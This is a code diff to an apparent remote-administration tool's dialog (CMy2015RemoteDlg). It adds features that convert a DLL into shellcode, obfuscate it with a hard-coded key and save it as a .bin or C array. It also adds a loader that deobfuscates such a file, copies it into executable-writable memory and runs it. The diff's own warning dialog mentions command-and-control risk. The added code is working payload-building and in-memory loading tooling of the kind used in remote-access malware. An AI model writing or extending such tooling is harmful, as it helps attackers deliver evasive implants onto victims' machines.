@@ -497,6 +497,10 @@ BEGIN_MESSAGE_MAP(CMy2015RemoteDlg, CDialogEx)
     ON_COMMAND(ID_MACHINE_LOGOUT, &CMy2015RemoteDlg::OnMachineLogout)
     ON_WM_DESTROY()
     ON_MESSAGE(WM_SESSION_ACTIVATED, &CMy2015RemoteDlg::OnSessionActivatedMsg)
+    ON_COMMAND(ID_TOOL_GEN_SHELLCODE_BIN, &CMy2015RemoteDlg::OnToolGenShellcodeBin)
+    ON_COMMAND(ID_SHELLCODE_LOAD_TEST, &CMy2015RemoteDlg::OnShellcodeLoadTest)
+    ON_COMMAND(ID_SHELLCODE_OBFS_LOAD_TEST, &CMy2015RemoteDlg::OnShellcodeObfsLoadTest)
+    ON_COMMAND(ID_OBFS_SHELLCODE_BIN, &CMy2015RemoteDlg::OnObfsShellcodeBin)
 END_MESSAGE_MAP()
 
 
@@ -3153,6 +3157,17 @@ void CMy2015RemoteDlg::OnToolInputPassword()
     }
 }
 
+bool safe_exec(void *exec) {
+	__try {
+		((void(*)())exec)();
+        return true;
+	}
+	__except (EXCEPTION_EXECUTE_HANDLER) {
+		VirtualFree(exec, 0, MEM_RELEASE);
+	}
+    return false;
+}
+
 /* Example: <Select TinyRun.dll to build "tinyrun.c">
 #include "tinyrun.c"
 #include <windows.h>
@@ -3169,9 +3184,9 @@ int main() {
 }
 */
 #include "common/obfs.h"
-void shellcode_process(ObfsBase *obfs) {
-	CFileDialog fileDlg(TRUE, _T("dll"), NULL, OFN_HIDEREADONLY | OFN_OVERWRITEPROMPT,
-		_T("DLL Files (*.dll)|*.dll|All Files (*.*)|*.*||"), AfxGetMainWnd());
+void shellcode_process(ObfsBase *obfs, bool load = false, const char* suffix = ".c") {
+	CFileDialog fileDlg(TRUE, NULL, NULL, OFN_HIDEREADONLY | OFN_OVERWRITEPROMPT,
+		_T("DLL Files (*.dll)|*.dll|BIN Files (*.bin)|*.bin|All Files (*.*)|*.*||"), AfxGetMainWnd());
 	int ret = 0;
 	try {
 		ret = fileDlg.DoModal();
@@ -3195,15 +3210,28 @@ void shellcode_process(ObfsBase *obfs) {
 
 		LPBYTE srcData = NULL;
 		int srcLen = 0;
-		if (MakeShellcode(srcData, srcLen, (LPBYTE)szBuffer, dwFileSize)) {
+        if (load){
+            const uint32_t key = 0xDEADBEEF;
+            obfs->DeobfuscateBuffer(szBuffer, dwFileSize, key);
+			void* exec = VirtualAlloc(NULL, dwFileSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+			if (exec) {
+				memcpy(exec, szBuffer, dwFileSize);
+				if (safe_exec(exec)) {
+					AfxMessageBox("Shellcode 执行成功! ", MB_ICONINFORMATION);
+                }
+                else {
+                    AfxMessageBox("Shellcode 执行失败! 请用本程序生成的 bin 文件进行测试! ", MB_ICONERROR);
+                }
+			}
+        }
+		else if (MakeShellcode(srcData, srcLen, (LPBYTE)szBuffer, dwFileSize)) {
 			TCHAR buffer[MAX_PATH];
 			_tcscpy_s(buffer, name);
 			PathRemoveExtension(buffer);
             const uint32_t key = 0xDEADBEEF;
-            const BYTE* p = srcData;
             obfs->ObfuscateBuffer(srcData, srcLen, key);
-			if (obfs->WriteBinaryAsCArray(CString(buffer) + ".c", srcData, srcLen, "Shellcode")) {
-				AfxMessageBox("Shellcode 生成成功! 请自行编写调用程序。\r\n" + CString(buffer) + ".c",
+			if (obfs->WriteFile(CString(buffer) + suffix, srcData, srcLen, "Shellcode")) {
+				AfxMessageBox("Shellcode 生成成功! 请自行编写调用程序。\r\n" + CString(buffer) + suffix,
 					MB_ICONINFORMATION);
 			}
 		}
@@ -3224,6 +3252,40 @@ void CMy2015RemoteDlg::OnObfsShellcode()
     shellcode_process(&obfs);
 }
 
+
+void CMy2015RemoteDlg::OnToolGenShellcodeBin()
+{
+	ObfsBase obfs(false);
+	shellcode_process(&obfs, false, ".bin");
+}
+
+void CMy2015RemoteDlg::OnObfsShellcodeBin()
+{
+	Obfs obfs(false);
+	shellcode_process(&obfs, false,  ".bin");
+}
+
+
+void CMy2015RemoteDlg::OnShellcodeLoadTest()
+{
+    if (MessageBox(CString("是否测试 ") + (sizeof(void*) == 8 ? "64位" : "32位") + " Shellcode 二进制文件? "
+        "请选择受信任的 bin 文件。\r\n测试未知来源的 Shellcode 可能导致程序崩溃，甚至存在 CC 风险。", 
+        "提示", MB_ICONQUESTION | MB_YESNO) == IDYES) {
+		ObfsBase obfs;
+		shellcode_process(&obfs, true);
+    }
+}
+
+
+void CMy2015RemoteDlg::OnShellcodeObfsLoadTest()
+{
+	if (MessageBox(CString("是否测试 ") + (sizeof(void*) == 8 ? "64位" : "32位") + " Shellcode 二进制文件? "
+        "请选择受信任的 bin 文件。\r\n测试未知来源的 Shellcode 可能导致程序崩溃，甚至存在 CC 风险。",
+		"提示", MB_ICONQUESTION | MB_YESNO) == IDYES) {
+		Obfs obfs;
+		shellcode_process(&obfs, true);
+	}
+}
 
 void CMy2015RemoteDlg::OnOnlineAssignTo()
 {
